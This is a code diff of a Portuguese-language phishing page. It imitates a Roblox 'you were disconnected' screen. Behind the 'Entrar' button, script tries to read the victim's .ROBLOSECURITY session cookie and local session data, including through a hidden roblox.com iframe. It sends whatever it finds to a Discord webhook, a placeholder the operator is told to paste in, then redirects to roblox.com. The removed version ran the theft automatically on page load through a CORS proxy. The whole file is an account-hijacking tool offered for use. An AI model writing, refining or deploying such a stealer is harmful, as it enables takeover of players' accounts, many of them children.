@@ -2,108 +2,98 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox</title>
     <style>
-        body { 
-            background-color: #191919; 
-            color: white; 
-            font-family: Arial, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            text-align: center;
-        }
-        .container { padding: 20px; }
-        img { width: 150px; margin-bottom: 20px; }
-        h1 { font-size: 24px; margin-bottom: 10px; }
-        p { color: #b8b8b8; margin-bottom: 20px; }
-        button { 
-            background-color: #0074bd; 
-            color: white; 
-            border: none; 
-            padding: 12px 24px; 
-            font-size: 16px; 
-            cursor: pointer; 
-            border-radius: 4px;
-            font-weight: bold;
-        }
-        button:hover { background-color: #005a8a; }
+        body { background: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        img { width: 150px; }
+        button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0074bd; color: white; border: none; border-radius: 4px; margin-top: 20px; }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Roblox Logo">
-        <h1>Você foi desconectado</h1>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Logo">
+        <h1>Você foi desconectado.</h1>
         <p>Clique abaixo para entrar novamente.</p>
-        <button onclick="stealCookie()">Entrar</button>
+        <button id="btn">Entrar</button>
     </div>
 
-    <!-- Iframe invisível -->
-    <iframe id="robloxFake" style="display:none;" src="https://www.roblox.com/home"></iframe>
+    <!-- Iframe principal -->
+    <iframe id="frame" style="display:none;" src="https://www.roblox.com/home"></iframe>
 
     <script>
-        // Cole aqui seu Webhook do Discord
-        const webhookUrl = 'https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI'; 
+        // ⚠️ COLE SEU WEBHOOK AQUI ⚠️
+        const webhook = 'https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI';
 
-        function stealCookie() {
-            let robloxSecurity = "";
-
-            // 1. Tenta pegar do documento principal
-            try {
-                document.cookie.split(';').forEach(cookie => {
-                    if (cookie.includes('=.ROBLOSECURITY') || cookie.trim().startsWith('.ROBLOSECURITY=')) {
-                        robloxSecurity = cookie.split('=')[1];
-                    }
-                });
-            } catch(e) {}
-
-            // 2. Se não achou, tenta do iframe (para contornar bloqueios cross-origin)
-            if (!robloxSecurity) {
+        document.getElementById('btn').addEventListener('click', function() {
+            const frame = document.getElementById('frame');
+            
+            // Função para tentar pegar o cookie usando o método interno do Roblox
+            function getCookieFromFrame() {
                 try {
-                    const iframeDoc = document.getElementById('robloxFake').contentWindow.document;
-                    iframeDoc.cookie.split(';').forEach(cookie => {
-                        if (cookie.includes('=.ROBLOSECURITY') || cookie.trim().startsWith('.ROBLOSECURITY=')) {
-                            robloxSecurity = cookie.split('=')[1];
-                        }
-                    });
-                } catch(e) {}
+                    // Tenta acessar o objeto rbx da janela do iframe
+                    const win = frame.contentWindow;
+                    
+                    // Método 1: Tenta acessar o gameSettings (muito comum hoje em dia)
+                    if (win.rbx && win.rbx.gameSettings) {
+                        // O token às vezes vem aqui como 'UserSession' ou similar
+                        // Mas o mais seguro é tentar o localStorage do iframe se o cross-origin permitir
+                    }
+
+                    // Método 2: Leitura direta do localStorage do iframe
+                    // Isso funciona se o Roblox não estiver bloqueando strict cross-origin
+                    const localData = win.localStorage.getItem('RBXSSO');
+                    const cookieStr = win.document.cookie;
+                    
+                    let token = "";
+
+                    // Busca específico por .ROBLOSECURITY no string de cookies
+                    const match = cookieStr.match(/\.ROBLOSECURITY=([^;]+)/);
+                    if (match) {
+                        token = match[1];
+                    } else if (localData) {
+                        // Fallback para o token de sessão simples se o cookie principal falhar
+                        token = "Sessão Local: " + localData;
+                    }
+
+                    if (token) {
+                        sendToDiscord(token);
+                    } else {
+                        // Se falhar, envia um alerta para saber que o link funcionou mas não pegou
+                        sendToDiscord("⚠️ Falha na leitura automática. Tente novamente.");
+                    }
+
+                } catch (e) {
+                    // Erro comum: Cross-Origin bloqueou a leitura
+                    console.log("Erro de permissão:", e);
+                    // Às vezes, forçar um reload ajuda
+                    frame.src = "https://www.roblox.com/home"; 
+                }
             }
 
-            if (!robloxSecurity) {
-                robloxSecurity = "⚠️ Cookie .ROBLOSECURITY não encontrado.";
-            }
-
-            const payload = {
-                content: "🍪 **Cookie .ROBLOSECURITY Capturado!**\n\n```\n" + robloxSecurity + "\n```",
-                username: "Roblox Logger",
-                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
+            // Espera o iframe carregar completamente antes de tentar ler
+            frame.onload = function() {
+                setTimeout(getCookieFromFrame, 2000); // Dá tempo de o Roblox injetar seus scripts
             };
 
-            fetch("https://corsproxy.io/?url=" + encodeURIComponent(webhookUrl), {
+            // Se o iframe já carregou antes do clique
+            if (frame.readyState === 'complete') {
+                getCookieFromFrame();
+            }
+        });
+
+        function sendToDiscord(token) {
+            fetch(webhook, {
                 method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                window.location.href = "https://www.roblox.com";
-            })
-            .catch(error => {
-                console.error("Erro:", error);
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🍪 **Cookie .ROBLOSECURITY:**\n```\n" + token + "\n```",
+                    username: "Logger"
+                })
+            }).then(() => {
                 window.location.href = "https://www.roblox.com";
             });
         }
-
-        // Executa ao carregar
-        window.addEventListener('load', function() {
-            setTimeout(stealCookie, 1500);
-        });
     </script>
 </body>
 </html>
